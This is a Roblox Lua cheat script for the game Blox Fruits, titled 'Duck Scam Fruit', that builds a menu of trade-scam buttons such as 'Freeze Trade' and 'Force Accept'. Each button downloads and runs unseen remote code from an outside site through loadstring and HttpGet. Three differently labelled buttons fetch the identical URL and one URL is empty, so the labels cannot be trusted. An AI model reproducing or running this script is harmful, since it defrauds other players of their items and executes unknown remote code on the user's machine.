local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Duck Scam Fruit | No ban 100%", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
    Name = "BloxFruit",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = Tab:AddSection({
    Name = "Scam trade By Duck Cheat"
}) 


OrionLib:MakeNotification({
    Name = "Duck Cheat",
    Content = "Duck Cheat",
    Image = "rbxassetid://4483345998",
    Time = 5
})


Tab:AddButton({
    Name = "Freeze Trade",
    Callback = function()
        loadstring(game:HttpGet('',true))()
         end    
})

Tab:AddButton({
    Name = "Force Accept",
    Callback = function()
        loadstring(game:HttpGet('https://darkscripts.space/scripts/1d682264-b402-42d2-964d-c4aec3bcbb03_948791371773403156.lua',true))()
         end    
})

Tab:AddButton({
    Name = "Freeze Player (Anti Jump)",
    Callback = function()
        loadstring(game:HttpGet('https://darkscripts.space/scripts/1d682264-b402-42d2-964d-c4aec3bcbb03_948791371773403156.lua',true))()
         end    
})

Tab:AddButton({
    Name = "Rejoin New server",
    Callback = function()
        loadstring(game:HttpGet('https://darkscripts.space/scripts/1d682264-b402-42d2-964d-c4aec3bcbb03_948791371773403156.lua',true))()
         end    
})

local CreditTab = Window:MakeTab({
    Name = "Credit",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

CreditTab:AddParagraph("DUCK PRO")

OrionLib:Init()

CreditTab:AddParagraph("Discord Coming Soon")

OrionLib:Init()
